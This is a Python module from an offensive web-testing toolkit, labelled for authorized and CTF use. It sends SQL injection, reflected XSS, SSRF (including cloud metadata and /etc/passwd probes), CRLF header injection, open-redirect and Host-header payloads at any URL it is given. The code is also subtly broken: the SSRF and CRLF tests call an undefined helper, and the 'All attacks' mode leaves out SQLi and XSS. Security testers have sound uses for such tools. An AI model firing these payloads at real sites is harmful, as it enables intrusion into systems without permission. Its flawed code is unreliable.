# -*- coding: utf-8 -*-
"""
MEOW-SEC :: HISS — SQLi / XSS / Quick Vuln Tester
For authorized security testing and CTF challenges
"""
import re, json, os, time
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from core.ui import console, ok, err, info, warn, find, boot_progress, print_result_table, show_module_banner, ask_target, ask_choice, G1, G2, CY, OR, RD, DM
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk
from rich.prompt import Prompt

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

# ─── PAYLOADS ────────────────────────────────────────────────

SQLI_PAYLOADS = [
    ("'",                   "Single quote"),
    ("''",                  "Double quote escape"),
    ("1' OR '1'='1",        "Classic OR bypass"),
    ("1' OR '1'='1'--",     "Comment bypass"),
    ("1'; --",              "Statement terminator"),
    ("1' AND 1=1--",        "True condition"),
    ("1' AND 1=2--",        "False condition"),
    ("' OR 1=1--",          "OR always true"),
    ("admin'--",            "Admin comment"),
    ("1 UNION SELECT NULL--","UNION test"),
    ("1 UNION SELECT NULL,NULL--", "UNION 2 cols"),
    ("1 UNION SELECT NULL,NULL,NULL--", "UNION 3 cols"),
    ("1'; WAITFOR DELAY '0:0:3'--", "Time-based (MSSQL)"),
    ("1' AND SLEEP(3)--",   "Time-based (MySQL)"),
    ("1' AND pg_sleep(3)--","Time-based (Postgres)"),
]

XSS_PAYLOADS = [
    ("<script>alert(1)</script>",       "Basic script tag"),
    ("<img src=x onerror=alert(1)>",    "Img onerror"),
    ("<svg onload=alert(1)>",           "SVG onload"),
    ("'\"><script>alert(1)</script>",   "Break out of attribute"),
    ("javascript:alert(1)",             "JS URI"),
    ("<body onload=alert(1)>",          "Body onload"),
    ("<%2fscript><script>alert(1)",     "URL encoded"),
    ("<details open ontoggle=alert(1)>","Details toggle"),
    ("\" autofocus onfocus=alert(1) \"","Focus event"),
    ("<iframe src=javascript:alert(1)>","Iframe JS"),
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ORA-", "sqlite_", "pg_query",
    "you have an error in your sql", "warning: mysql", "unclosed quotation",
    "quoted string not properly terminated", "microsoft ole db provider for sql",
    "syntax error", "odbc microsoft access driver", "jdbc",
    "sqlstate", "syntax error near",
]

# ─── HTTP HELPER ─────────────────────────────────────────────

def _get(url, params=None, timeout=8):
    if not HAS_REQUESTS:
        return None
    try:
        return requests.get(url, params=params, timeout=timeout,
                            verify=False, allow_redirects=True, proxies=_px(),
                            headers={"User-Agent": "MEOW-HISS/1.0 (authorized-test)"})
    except Exception:
        return None

def _post(url, data=None, timeout=8):
    if not HAS_REQUESTS:
        return None
    try:
        return requests.post(url, data=data, timeout=timeout,
                             verify=False, allow_redirects=True, proxies=_px(),
                             headers={"User-Agent": "MEOW-HISS/1.0 (authorized-test)"})
    except Exception:
        return None

# ─── INJECT ──────────────────────────────────────────────────

def test_sqli_param(base_url: str, param: str, baseline_len: int) -> list:
    """Teste un paramètre GET pour SQLi"""
    vulns = []
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query)

    for payload, name in SQLI_PAYLOADS:
        test_params = {k: (v[0] if v else "") for k, v in params.items()}
        test_params[param] = payload

        r = _get(base_url.split("?")[0], params=test_params)
        if r is None:
            continue

        body = r.text.lower()
        # Détection par erreur SQL
        for err_sig in SQLI_ERRORS:
            if err_sig in body:
                vulns.append({"param": param, "payload": payload, "type": "Error-based", "evidence": err_sig})
                find(f"[{RD}]SQLI[/] [{CY}]{param}[/] → Error: [{OR}]{err_sig}[/]")
                break
        # Détection par diff de longueur
        diff = abs(len(r.text) - baseline_len)
        if diff > 200 and not vulns:
            vulns.append({"param": param, "payload": payload, "type": "Length-diff", "evidence": f"diff={diff}"})

    return vulns

def test_xss_param(base_url: str, param: str) -> list:
    """Teste un paramètre GET pour XSS"""
    vulns = []
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query)

    for payload, name in XSS_PAYLOADS:
        test_params = {k: (v[0] if v else "") for k, v in params.items()}
        test_params[param] = payload

        r = _get(base_url.split("?")[0], params=test_params)
        if r is None:
            continue

        # Vérifie si le payload est réfléchi sans encodage
        if payload in r.text:
            vulns.append({"param": param, "payload": payload[:60], "type": "Reflected XSS", "evidence": "payload reflected"})
            find(f"[{RD}]XSS[/] [{CY}]{param}[/] → [{OR}]reflected[/]  [{DM}]{payload[:40]}[/]")
            break

    return vulns

# ─── CRAWL FORMS ─────────────────────────────────────────────

def extract_params(url: str) -> list:
    """Extrait les paramètres depuis l'URL"""
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    return params

def crawl_forms(url: str) -> list:
    """Trouve les formulaires sur la page"""
    if not HAS_REQUESTS:
        return []
    try:
        from html.parser import HTMLParser

        class FormParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.forms = []
                self.current_form = None
            def handle_starttag(self, tag, attrs):
                a = dict(attrs)
                if tag == "form":
                    self.current_form = {"action": a.get("action", ""), "method": a.get("method", "GET").upper(), "inputs": []}
                    self.forms.append(self.current_form)
                elif tag in ("input", "textarea") and self.current_form:
                    name = a.get("name", "")
                    if name:
                        self.current_form["inputs"].append({"name": name, "type": a.get("type", "text")})

        r = requests.get(url, timeout=8, verify=False, proxies=_px(), headers={"User-Agent": "MEOW-HISS/1.0"})
        parser = FormParser()
        parser.feed(r.text)
        return parser.forms
    except Exception:
        return []

# ─── MAIN HISS ───────────────────────────────────────────────

def run(target: str = None):
    show_module_banner("hiss")
    cat_talk(CAT_SCAN, "HISS vuln tester online — testing for SQLi and XSS...", OR)
    console.print()

    warn("Use only on systems you own or have written permission to test.")
    console.print()

    if not target:
        target = ask_target("Target URL (with parameters, e.g. https://site.com/page?id=1)")
    if not target:
        err("No target."); return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    info(f"Target: [{CY}]{target}[/]")

    console.print(f"\n  [{G1}][1][/] SQLi only")
    console.print(f"  [{G1}][2][/] XSS only")
    console.print(f"  [{G1}][3][/] SQLi + XSS")
    console.print(f"  [{G1}][4][/] Crawl forms")
    console.print(f"  [{G1}][5][/] SSRF probes")
    console.print(f"  [{G1}][6][/] CRLF / Header injection")
    console.print(f"  [{G1}][7][/] Open redirect")
    console.print(f"  [{G1}][8][/] Host header injection")
    console.print(f"  [{G1}][9][/] All attacks")
    mode = ask_choice("Mode", "3")

    params = extract_params(target)
    if not params:
        warn("No GET parameters detected in URL.")
        manual = Prompt.ask(f"  [{G1}]◈ Enter parameter name manually (or ENTER to skip)[/]", default="")
        if manual:
            params = [manual.strip()]
        else:
            if mode == "4":
                forms = crawl_forms(target)
                if forms:
                    info(f"Found {len(forms)} form(s) on page:")
                    for i, form in enumerate(forms):
                        info(f"  Form {i+1}: method={form['method']}  inputs={[x['name'] for x in form['inputs']]}")
                return
            err("No parameters to test."); return

    info(f"Parameters found: {params}")
    console.print()

    boot_progress([
        "Establishing baseline...",
        "Loading payloads...",
        "Injecting test vectors...",
        "Analyzing responses...",
        "Compiling findings...",
    ])

    console.print()
    from rich.rule import Rule

    all_vulns = []

    # Baseline
    baseline = _get(target)
    baseline_len = len(baseline.text) if baseline else 0

    for param in params:
        info(f"Testing parameter: [{CY}]{param}[/]")

        if mode in ("1", "3"):
            console.print(Rule(f"[{G1}] SQLI :: {param} ", style=G2))
            vulns = test_sqli_param(target, param, baseline_len)
            all_vulns.extend(vulns)
            if not vulns:
                info(f"  [{DM}]No SQLi detected for [{param}][/]")

        if mode in ("2", "3"):
            console.print(Rule(f"[{G1}] XSS :: {param} ", style=G2))
            vulns = test_xss_param(target, param)
            all_vulns.extend(vulns)
            if not vulns:
                info(f"  [{DM}]No XSS detected for [{param}][/]")

        if mode == "4":
            forms = crawl_forms(target)
            if forms:
                info(f"Found {len(forms)} form(s):")
                for form in forms:
                    console.print(f"  [{CY}]{form['method']}[/]  action=[{G1}]{form['action']}[/]  inputs={[x['name'] for x in form['inputs']]}")

        if mode in ("5", "9"):
            from rich.rule import Rule as _Rule
            console.print(_Rule(f"[{G1}] SSRF :: {param} ", style=G2))
            vulns = _test_ssrf(target, param)
            all_vulns.extend(vulns)

        if mode in ("6", "9"):
            from rich.rule import Rule as _Rule
            console.print(_Rule(f"[{G1}] CRLF :: {param} ", style=G2))
            vulns = _test_crlf(target, param)
            all_vulns.extend(vulns)

        if mode in ("7", "9"):
            from rich.rule import Rule as _Rule
            console.print(_Rule(f"[{G1}] OPEN REDIRECT :: {param} ", style=G2))
            vulns = _test_redirect(target, param)
            all_vulns.extend(vulns)

        if mode in ("8", "9"):
            from rich.rule import Rule as _Rule
            console.print(_Rule(f"[{G1}] HOST HEADER INJECTION ", style=G2))
            vulns = _test_host_header(target)
            all_vulns.extend(vulns)

    console.print()

    if all_vulns:
        cat_talk(CAT_FOUND, f"{len(all_vulns)} vulnerability/ies found!", G1)
        rows = [(v["param"], v["type"], v["payload"][:40], v["evidence"][:40]) for v in all_vulns]
        print_result_table(
            f"HISS RESULTS :: {target}",
            ["PARAM", "TYPE", "PAYLOAD", "EVIDENCE"],
            rows
        )
    else:
        info("No obvious vulnerabilities detected.")

    _save(target, all_vulns)

# ─── SSRF ────────────────────────────────────────────────────

SSRF_PAYLOADS = [
    ("http://127.0.0.1/",          "localhost"),
    ("http://localhost/",           "localhost alt"),
    ("http://169.254.169.254/",     "AWS metadata"),
    ("http://169.254.169.254/latest/meta-data/", "AWS meta-data"),
    ("http://[::1]/",               "IPv6 localhost"),
    ("http://0.0.0.0/",             "0.0.0.0"),
    ("http://0/",                   "0 shorthand"),
    ("http://2130706433/",          "127.0.0.1 decimal"),
    ("http://017700000001/",        "127.0.0.1 octal"),
    ("http://0x7f000001/",          "127.0.0.1 hex"),
    ("dict://127.0.0.1:6379/",      "Redis via dict://"),
    ("file:///etc/passwd",          "Local file"),
    ("file:///C:/Windows/win.ini",  "Windows file"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance", "Azure metadata"),
]

SSRF_INDICATORS = ["root:", "metadata", "ami-id", "instance-id",
                   "computeMetadata", "for 16-bit", "[boot loader]",
                   "localhost", "127.0.0.1", "internal"]

def _test_ssrf(url: str, param: str) -> list:
    found = []
    for payload, desc in SSRF_PAYLOADS:
        r = _inject(url, param, payload)
        if r:
            body = r.text
            for ind in SSRF_INDICATORS:
                if ind.lower() in body.lower():
                    find(f"SSRF [{OR}]{desc}[/] → indicator [{G1}]{ind}[/]")
                    found.append({"param": param, "type": "SSRF",
                                  "payload": payload, "evidence": ind})
                    break
    if not found: info(f"  [{DM}]No SSRF detected[/]")
    return found

# ─── CRLF ────────────────────────────────────────────────────

CRLF_PAYLOADS = [
    "%0d%0aX-Injected: meow",
    "%0aX-Injected: meow",
    "%0d%0a%0d%0a<html>CRLF</html>",
    "%E5%98%8A%E5%98%8DX-Injected: meow",  # Unicode CRLF bypass
    "%0d%0aSet-Cookie: meow=1",
    "%0ASet-Cookie: meow=1",
]

def _test_crlf(url: str, param: str) -> list:
    found = []
    for payload in CRLF_PAYLOADS:
        r = _inject(url, param, payload)
        if r:
            hdrs_low = {k.lower(): v for k, v in r.headers.items()}
            if "x-injected" in hdrs_low or "meow" in str(r.headers).lower():
                find(f"CRLF injection in [{CY}]{param}[/]")
                found.append({"param": param, "type": "CRLF",
                              "payload": payload, "evidence": "header injected"})
                break
            if "CRLF" in r.text or "<html>CRLF" in r.text:
                find(f"CRLF body injection in [{CY}]{param}[/]")
                found.append({"param": param, "type": "CRLF",
                              "payload": payload, "evidence": "body injection"})
                break
    if not found: info(f"  [{DM}]No CRLF detected[/]")
    return found

# ─── OPEN REDIRECT ───────────────────────────────────────────

REDIRECT_PAYLOADS = [
    "//evil.com", "https://evil.com", "//evil.com/%2F..",
    "///evil.com", "////evil.com", "/\\evil.com",
    "https:evil.com", "http:evil.com",
    "%2F%2Fevil.com", "%68%74%74%70%73%3a%2f%2fevil.com",
    "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
]

def _test_redirect(url: str, param: str) -> list:
    found = []
    for payload in REDIRECT_PAYLOADS:
        try:
            import requests as _req
            r = _req.get(_inject_url(url, param, payload),
                         timeout=8, verify=False, allow_redirects=False,
                         headers={"User-Agent": "Mozilla/5.0"})
            loc = r.headers.get("Location","")
            if "evil.com" in loc or loc.startswith("//evil") or loc.startswith("https://evil"):
                find(f"Open redirect in [{CY}]{param}[/] → [{OR}]{loc}[/]")
                found.append({"param": param, "type": "OPEN_REDIRECT",
                              "payload": payload, "evidence": loc})
                break
        except Exception:
            pass
    if not found: info(f"  [{DM}]No open redirect detected[/]")
    return found

def _inject_url(url: str, param: str, payload: str) -> str:
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    new_q = urlencode(qs, doseq=True)
    return urlunparse(p._replace(query=new_q))

# ─── HOST HEADER INJECTION ───────────────────────────────────

def _test_host_header(url: str) -> list:
    found = []
    evil  = "evil.com"
    payloads = [
        {"Host": evil},
        {"Host": f"evil.com:80"},
        {"X-Forwarded-Host": evil},
        {"X-Host": evil},
        {"X-Forwarded-Server": evil},
    ]
    try:
        import requests as _req
        for hdrs in payloads:
            r = _req.get(url, headers={**hdrs, "User-Agent": "Mozilla/5.0"},
                         timeout=8, verify=False, allow_redirects=False)
            if evil in r.text or evil in str(r.headers):
                hdr_name = list(hdrs.keys())[0]
                find(f"Host header injection via [{CY}]{hdr_name}[/]")
                found.append({"param": "Host", "type": "HOST_HEADER",
                              "payload": evil, "evidence": hdr_name})
                break
    except Exception:
        pass
    if not found: info(f"  [{DM}]No host header injection detected[/]")
    return found

def _save(target, vulns):
    out_dir = os.path.join(os.path.dirname(__file__), "..", "data")
    os.makedirs(out_dir, exist_ok=True)
    slug = target.replace("://", "_").replace("/", "_").replace(".", "_")[:40]
    fname = os.path.join(out_dir, f"hiss_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "vulns": vulns}, f, indent=2)
    ok(f"Results saved → [{CY}]{os.path.basename(fname)}[/]")
